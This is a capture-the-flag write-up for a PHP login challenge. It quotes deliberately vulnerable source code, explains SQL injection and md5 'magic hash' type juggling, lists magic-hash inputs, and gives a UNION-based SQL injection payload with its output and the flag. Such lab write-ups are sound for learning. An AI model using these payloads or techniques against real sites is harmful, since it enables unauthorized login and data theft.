# Too-many-admins

## Description 

Too many admins spoil the broth. Can you login as the right admin and get the flag?

## Writeup
On launching the challenge we land at the homepage with two fields username and password, a classic authentication bypass

![image](https://github.com/user-attachments/assets/d6852b10-346d-4e93-8224-540102eafcfa)


On reading the source provided we can easily see to dump the details of all users we need to visit http://localhost:8000/?user=all
```php
    // Fetch the 'user' parameter from the query string
    $userParam = $_GET['user'];

    // Use prepared statement to prevent SQL injection
    if($userParam){
    if($userParam !=  "all"){
    $query = "SELECT username, password, bio FROM users where username = '$userParam' ";
    }else{
    $query = "SELECT username, password, bio FROM users "
    }
```
![image](https://github.com/user-attachments/assets/0e787eaf-e0eb-42a6-90cf-9441056093c2)


On looking through dump.sql we find that we need to login as some user and his bio will contain the flag.

![image](https://github.com/user-attachments/assets/e68156b9-e7cc-4ad9-b8fb-9885dc8e0c6e)

## Key Issues and Vulnerabilities
1. SQL Injection:

- The code is vulnerable to SQL injection because the ```username``` is directly included in the SQL query without proper sanitization or use of prepared statements.

2. Weak Password Hashing:

- The ```md5``` function is used for hashing, which is not considered secure for password hashing. Additionally, the specific hash value ```0e0776470569150041331763470558650263116470594705``` can lead to a type juggling vulnerability in PHP.

3. Type Juggling:

- In PHP, the comparison ```==``` can lead to type juggling, where a string starting with ```0e``` is considered as a float (scientific notation). This can be exploited, especially with the ```md5``` function, as certain inputs could produce a hash that starts with ```0e```, resulting in a false-positive match.

## Exploitation
To exploit this, you'll need to find a string that, when multiplied by 676 (which is 2 * 2 * 13 * 13), produces a 0e hash.

- Several strings are known to produce 0e-style md5 hashes. For example:
  - ```"240610708"``` → ```md5("240610708")``` → ```"0e462097431906509019562988736854"```.
  - ```"QNKCDZO"``` → ```md5("QNKCDZO")``` → ```"0e830400451993494058024219903391"```.
```php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        if (empty($username) || empty($password)) {
            echo "Please fill in both fields.";
        } else {
    $query = "SELECT username, password, bio FROM users WHERE username = '$username' ";
    $result = $conn->query($query);
    $mysupersecurehash = md5(2*2*13*13*((int)$password));
    $i =0 ;
    while ($row = mysqli_fetch_row($result)) {
        if((int)$row[1] == $mysupersecurehash && $mysupersecurehash == 0e0776470569150041331763470558650263116470594705){
        echo "<h1>You win</h1> \n";
    echo "Did you really? \n";
        echo "<tr><td>" .$i. " </td><td> "  . $row[0] . " </td><td> " . $row[1] . " </td><td> " . $row[2] . " </td></tr>";
        $i++;
    }else{
        echo "<h1>Wrong password</h1>";
    }
}
        }
    }
```
On reading about php comparison operations we find the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md">typejuggling</a> vulnerability. Now we need to find the right admin which can be easily found by bruteforcing the cred for those admins whose password hash begins with "0e"

```bash
flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}
```
## Other Solution (SQLi)
So, obvious SQL injection in the php code and since we have dump.sql, we know what columns are in what tables. Thus, below is a SQLi payload to extract the flag, since we know it is in the bio.

```
GET /?user=' UNION SELECT 1,bio,3 FROM users WHERE bio LIKE "%Flag{%";-- -
```

The response is: -

```
S.no	Username	Password(MD5 hashes)
0	1	flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}
```

